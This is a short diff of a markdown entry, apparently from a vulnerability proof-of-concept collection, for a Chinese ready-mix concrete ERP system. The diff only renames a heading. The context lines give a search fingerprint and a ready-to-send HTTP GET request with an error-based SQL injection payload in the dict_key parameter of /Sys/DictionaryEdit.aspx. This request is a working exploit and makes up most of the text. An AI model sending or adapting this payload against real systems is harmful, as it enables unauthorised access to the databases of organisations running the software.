@@ -5,7 +5,7 @@
 title="商混ERP系统"
 ```
 
-## poc
+## POC
 ```
 GET /Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(100),substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32))-- HTTP/1.1
 Host: 
